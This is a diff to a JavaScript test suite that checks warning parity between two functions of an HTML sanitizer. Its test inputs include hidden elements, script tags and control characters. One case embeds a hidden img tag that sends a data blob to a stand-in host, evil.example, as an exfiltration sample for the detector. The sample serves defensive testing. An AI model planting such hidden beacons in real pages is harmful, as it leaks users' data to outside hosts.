@@ -31,11 +31,11 @@ import { LONE_SURROGATE_WARNING } from "../src/warnings.mjs";
 
 const BLOB = "A".repeat(44);
 
-// Inputs chosen to reach every Layer-2/3 warning branch: a comment splice, a
-// hidden-element splice, both together, a preserved scripting tag, a preserved
+// Inputs chosen to reach every Layer-2/3 warning branch: a comment-only
+// splice, a hidden-element splice, a preserved scripting tag, a preserved
 // data: URI, one exfil reason, two distinct exfil reasons, and a benign case.
 const CASES = [
-  ["comment only", "a <!-- hi --> b"],
+  ["comment only (spliced, comment-count warning)", "a <!-- hi --> b"],
   ["hidden element", "a <span hidden>S</span> b"],
   ["comment + hidden", "a <!-- one --> b <span hidden>S</span> c"],
   ["preserved script", "see <script>x</script> source"],
@@ -53,12 +53,15 @@ const CASES = [
     `<div hidden><img src="https://evil.example/x?data=${BLOB}"></div>`,
   ],
   ["benign html", "hello <b>world</b>"],
-  // Layer 1 AND Layer 2 in one input, so the "every unfiltered warning is a
-  // Layer 1 alongside Layer 2, so the Layer-1 lines are compared too rather
-  // than the corpus only ever exercising Layers 2/3.
-  ["zero-width char inside spliced html", "a\u200b<!-- hi --> b"],
-  ["lone surrogate inside spliced html", "a\ud800<!-- hi --> b"],
-  ["ansi escape inside spliced html", "a\u001b[31mred\u001b[0m <!-- hi --> b"],
+  // Layer 1 AND Layer 2 in one input, so the combined warning list (Layer-1
+  // lines alongside the Layer-2 splice line, in order) is compared too rather
+  // than the corpus only ever exercising one layer per case.
+  ["zero-width char beside spliced html", "a\u200b<i hidden>S</i> b"],
+  ["lone surrogate beside spliced html", "a\ud800<i hidden>S</i> b"],
+  [
+    "ansi escape beside spliced html",
+    "a\u001b[31mred\u001b[0m <i hidden>S</i> b",
+  ],
 ];
 
 describe("warning parity between sanitize() and sanitizeText()", () => {
@@ -88,8 +91,9 @@ describe("warning parity between sanitize() and sanitizeText()", () => {
       );
       if (root.warnings.length + root.notes.length > 0) withWarnings++;
     }
-    // Non-vacuity: an empty-vs-empty comparison proves nothing, so most cases
-    // must actually have produced warnings.
+    // Non-vacuity: an empty-vs-empty comparison proves nothing, so every case
+    // except the one deliberately silent one ("benign html") must have warned —
+    // a comments-only input warns again now that comments are spliced.
     assert.ok(
       withWarnings >= CASES.length - 1,
       `only ${withWarnings}/${CASES.length} cases produced any finding`,
@@ -133,7 +137,7 @@ describe("warning parity between sanitize() and sanitizeText()", () => {
     assert.deepEqual(root.found, []);
 
     // And the gate is not vacuously false: a tagged input still reaches Layer 2.
-    const gateTrue = "a <!-- hi --> b";
+    const gateTrue = "a <span hidden>S</span> b";
     assert.equal(needsMarkdownPipeline(gateTrue), true);
     const reached = await sanitize(gateTrue, { html: true });
     assert.ok(reached.warnings.some((w) => w.startsWith("HTML sanitized:")));
